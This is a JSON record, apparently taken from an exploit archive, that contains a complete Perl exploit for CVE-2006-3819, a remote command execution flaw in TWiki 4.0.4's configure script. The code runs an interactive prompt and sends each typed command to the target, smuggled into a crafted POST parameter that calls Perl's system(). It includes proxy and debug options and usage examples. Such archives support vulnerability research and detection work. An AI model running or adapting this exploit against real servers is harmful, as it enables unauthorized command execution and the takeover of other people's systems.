{
  "id": "2143",
  "title": "TWiki 4.0.4 - &#039;configure&#039; Remote Command Execution",
  "cve": "CVE-2006-3819",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl \r\n# Tue Aug  1 13:18:12 CEST 2006 jolascoaga@514.es\r\nuse strict;\r\nuse LWP::UserAgent;\r\nuse LWP::Simple;\r\nuse HTTP::Request;\r\nuse HTTP::Response;\r\nuse Getopt::Long;\r\n$| = 1;   # couse 1 is bigger than 0\r\nmy ($proxy,$proxy_user,$proxy_pass);\r\nmy ($host,$debug,$dir, $command);\r\nmy $options = GetOptions (\r\n  'host=s'\t      => \\$host, \r\n  'dir=s'\t      => \\$dir,\r\n  'proxy=s'           => \\$proxy,\r\n  'proxy_user=s'      => \\$proxy_user,\r\n  'proxy_pass=s'      => \\$proxy_pass,\r\n  'debug'             => \\$debug);\r\n&help unless ($host); # you dont need root\r\n$dir = \"/twiki/bin/configure\" unless($dir); # ... we have a template for this\r\nprint \"$host - $dir\\n\";\r\nwhile () {\r\n\t\tprint \"tinkiwinki> \"; # phf haquerz style\r\n\t\twhile(<STDIN>) {\r\n\t\t\t\t$command=$_;\r\n\t\t\t\tchomp($command);\r\n\t\t\t\tlast;\r\n\t\t}\r\n\t\t&send($command);\r\n}\r\n\r\nsub send {\r\n    my ($cmd) = @_;\r\n    my $ok\t=\t0;\r\n    my $socket;\r\n    LWP::Debug::level('+') if $debug; # but remember this is crap :D\r\n    my $ua = new LWP::UserAgent();   \r\n    $ua->agent(\"safari/zoo\"); \r\n    if ($host !~ /^http/) {\r\n\t$host = sprintf (\"http://%s\", $host); # CRAP CRAP CRAP\r\n    }\r\n    my $req = HTTP::Request->new(POST => $host.$dir);\r\n    $req->content('action=update&TYPEOF%3A%29%3Bsystem%28%27'.$cmd.'%27%29%3Bmy+@a%3D%28=anything&submit=Submit');\r\n    $ua->proxy(['http'] => $proxy) if $proxy;\r\n    $req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;\r\n    print $req->as_string() if $debug; \r\n    my $res = $ua->request($req);\r\n    my $html = $res->content(); \r\n    $html =~ m/<body.*?>(.*?)<div/si; # <pus>\r\n    print $1.\"\\n\";\r\n    if ($debug) {\r\n\t\topen (DEBG, \">wikidebug\");\r\n\t\tprint DEBG $html;\r\n    }\r\n}\r\nsub help {\r\n    print \"Syntax: ./$0 --host=url --dir=/horde [options]\\n\";\r\n    print \"\\t--proxy (http), --proxy_user, --proxy_pass\\n\";\r\n    print \"\\t--debug\\n\";\r\n    print \"the default directory is /twiki/bin/configure\\n\";\r\n    print \"\\nExample\\n\";\r\n    print \"bash# $0 --host=http(s)://www.server.com/\\n\";\r\n    print \"\\n\";\r\n    exit(1);\r\n}\r\nexit 0;\r\n# <END OF EXPLOIT>\r\n\r\n# milw0rm.com [2006-08-07]",
  "url": "https://www.exploit-db.com/exploits/2143"
}